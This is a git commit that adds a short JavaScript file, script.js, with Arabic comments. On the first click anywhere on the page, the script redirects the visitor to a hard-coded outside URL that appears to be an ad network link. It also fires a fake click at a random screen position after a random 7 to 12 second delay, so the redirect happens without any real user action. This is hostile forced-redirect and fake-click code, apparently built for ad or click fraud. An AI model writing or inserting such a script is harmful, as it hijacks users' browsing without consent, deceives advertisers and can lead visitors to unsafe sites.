3ec65e2b6e929e4a341da3168abca343deb02975
fouaadwork <fouaad.work@gmail.com>
2025-08-05 15:06:59 +0300

    script.js

---
+++ script.js
@@ -0,0 +1,39 @@
+(function() {
+  var redirected = false;
+  var url = "https://otieu.com/4/9654336";
+
+  // عند الضغط اليدوي
+  document.addEventListener("click", function () {
+    if (!redirected) {
+      redirected = true;
+      window.location.href = url;
+    }
+  });
+
+  // وظيفة تنفيذ نقرة وهمية
+  function simulateClick(x, y) {
+    var evt = new MouseEvent("click", {
+      bubbles: true,
+      cancelable: true,
+      view: window,
+      clientX: x,
+      clientY: y
+    });
+    var el = document.elementFromPoint(x, y);
+    if (el) {
+      el.dispatchEvent(evt);
+    }
+  }
+
+  // وقت عشوائي بين 7 و 12 ثانية
+  var randomDelay = Math.floor(Math.random() * 5000) + 7000;
+
+  // بعد مرور الوقت، يتم تنفيذ نقرة عشوائية
+  setTimeout(function () {
+    var width = window.innerWidth;
+    var height = window.innerHeight;
+    var randomX = Math.floor(Math.random() * width);
+    var randomY = Math.floor(Math.random() * height);
+    simulateClick(randomX, randomY);
+  }, randomDelay);
+})();
